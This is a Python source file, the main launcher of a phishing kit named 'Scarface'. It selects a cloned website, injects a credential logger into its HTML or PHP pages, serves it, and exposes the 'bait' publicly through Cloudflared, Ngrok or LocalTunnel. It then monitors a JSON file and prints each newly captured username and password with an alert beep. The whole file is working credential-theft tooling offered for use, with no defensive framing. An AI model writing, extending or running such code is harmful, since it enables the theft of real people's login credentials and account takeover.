import os
import sys
import time
import json

from utils import (
    SCARFACE_ROOT, CREDENTIALS_DIR, CYAN, BLUE, RED, GREEN, LIGHT_GREEN, BOLD, RESET,
    list_cloned_sites, get_site_dir, select_site, clear_screen, find_main_file, print_banner_and_url
)
from flask_server import launch_flask_server
from php import launch_php_server
from tunnel import run_expose_and_get_url

sys.path.insert(0, os.path.join(SCARFACE_ROOT, "src", "services", "injector"))
from inject import inject_logger_to_all_html, inject_logger_to_php

EXPOSE_DIR = os.path.join(SCARFACE_ROOT, "src", "services", "expose")

def prompt_for_port(default_port=8080):
    print(f"\n{BLUE}Choose a port to host the server on:{RESET}")
    print(f"{CYAN}1.{RESET} 8080 (Default)")
    print(f"{CYAN}2.{RESET} 2000")
    print(f"{CYAN}3.{RESET} 5000")
    print(f"{CYAN}4.{RESET} Custom")
    while True:
        try:
            choice = int(input(f"\n{BLUE}Select port option:{RESET} "))
            if choice == 1:
                return 8080
            elif choice == 2:
                return 2000
            elif choice == 3:
                return 5000
            elif choice == 4:
                port = input(f"{BLUE}Enter custom port (1024-65535):{RESET} ")
                if port.isdigit() and 1024 <= int(port) <= 65535:
                    return int(port)
                else:
                    print(f"{RED}[ERROR] Invalid port number, must be 1024-65535.{RESET}")
            else:
                print(f"{RED}[ERROR] Invalid option{RESET}")
        except ValueError:
            print(f"{RED}[ERROR] Enter a number{RESET}")

def expose_menu():
    print(f"\n{BOLD}{BLUE}Expose the bait{RESET}")
    print(f"{CYAN}1.{RESET} Cloudflared (Cloudflare Tunnel)")
    print(f"{CYAN}2.{RESET} Ngrok")
    print(f"{CYAN}3.{RESET} LocalTunnel")
    print(f"{CYAN}4.{RESET} Localhost only")
    print(f"{CYAN}5.{RESET} Exit")
    while True:
        try:
            option = int(input(f"\n{BLUE}Choose an option:{RESET} "))
            if 1 <= option <= 5:
                return option
            print(f"{RED}[ERROR] Invalid option{RESET}")
        except ValueError:
            print(f"{RED}[ERROR] Enter a number{RESET}")

def get_credential_count(site_name):
    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
    credentials_file = os.path.join(site_dir, "result.json")
    if not os.path.exists(credentials_file):
        return 0
    try:
        with open(credentials_file, "r") as f:
            data = json.load(f)
            if isinstance(data, list):
                return len(data)
    except Exception:
        pass
    return 0

def print_credentials(site_name):
    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
    credentials_file = os.path.join(site_dir, "result.json")
    if not os.path.exists(credentials_file):
        return
    with open(credentials_file, "r") as f:
        try:
            creds = json.load(f)
        except json.JSONDecodeError:
            return
    if not creds:
        return
    print(f"\n{BOLD}{BLUE}Latest Captured Credentials:{RESET}")
    for i, cred in enumerate(creds[-5:][::-1], 1):
        print(f"\n{BLUE}{i}. Time: {cred.get('timestamp', 'N/A')}{RESET}")
        data = cred.get('data', {}) or cred.get('form_data', {})
        if not data and 'raw' in cred:
            print(f"   {BLUE}raw:{RESET} {cred['raw']}")
        else:
            for key, value in data.items():
                print(f"   {BLUE}{key}:{RESET} {value}")

def monitor_credentials(site_name):
    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
    credentials_file = os.path.join(site_dir, "result.json")
    last_count = 0
    if not os.path.exists(credentials_file):
        os.makedirs(site_dir, exist_ok=True)
        with open(credentials_file, 'w') as f:
            json.dump([], f)
    else:
        try:
            with open(credentials_file, 'r') as f:
                last_count = len(json.load(f))
        except json.JSONDecodeError:
            last_count = 0
    print(f"\n{BOLD}{BLUE}Waiting for credentials... (Ctrl+C to stop){RESET}")
    try:
        while True:
            with open(credentials_file, 'r') as f:
                try:
                    current_count = len(json.load(f))
                except json.JSONDecodeError:
                    current_count = 0
            if current_count > last_count:
                print(f"\n{BOLD}{BLUE}NEW CREDENTIALS CAPTURED!{RESET}")
                print_credentials(site_name)
                last_count = current_count
                try:
                    import winsound
                    winsound.Beep(1000, 300)
                except:
                    pass
            time.sleep(1)
    except KeyboardInterrupt:
        pass

def main():
    if not os.path.exists(CREDENTIALS_DIR):
        os.makedirs(CREDENTIALS_DIR)
    clear_screen()
    cloned_sites = list_cloned_sites()
    if not cloned_sites:
        print(f"{RED}[INFO] No sites found in sites directory.{RESET}")
        sys.exit(1)
    selected_site_name = select_site(cloned_sites)
    selected_site_dir = get_site_dir(selected_site_name)
    main_file, site_type = find_main_file(selected_site_dir)
    if not main_file:
        print(f"{RED}[ERROR] No main HTML or PHP file found in {selected_site_dir}{RESET}")
        sys.exit(1)
    
    if site_type == "php":
        inject_logger_to_php(selected_site_dir, selected_site_name, CREDENTIALS_DIR)
    else:
        inject_logger_to_all_html(selected_site_dir)
        
    listen_port = prompt_for_port()
    try:
        if site_type == "php":
            php_proc, actual_port = launch_php_server(selected_site_dir, main_file, listen_port)
            print(f"{BLUE}Server started on port {actual_port}{RESET}")
        else:
            main_file_rel = os.path.relpath(main_file, selected_site_dir)
            site_credentials_dir = os.path.join(CREDENTIALS_DIR, selected_site_name)
            flask_proc = launch_flask_server(selected_site_dir, main_file_rel, site_credentials_dir, listen_port)
            print(f"{BLUE}Server started on port {listen_port}{RESET}")
    except Exception as e:
        print(f"{RED}Failed to start server: {e}{RESET}")
        sys.exit(1)
    time.sleep(1)
    clear_screen()
    option = expose_menu()
    if option in (1, 2, 3):
        clear_screen()
        print(f"{GREEN}Starting tunnel please wait...{RESET}")
        url, tunnel_proc = run_expose_and_get_url(option, EXPOSE_DIR, listen_port)
        if not url:
            print(f"{RED}[ERROR] Tunnel failed or exited.{RESET}")
            sys.exit(1)
        print_banner_and_url(url)
    elif option == 4:
        url = f"http://localhost:{listen_port}"
        print_banner_and_url(url)
    else:
        sys.exit(0)
    monitor_credentials(selected_site_name)
    print(f"\n{BLUE}Goodbye from Scarface!{RESET}")
    sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}Operation cancelled by user.{RESET}")
        sys.exit(1)
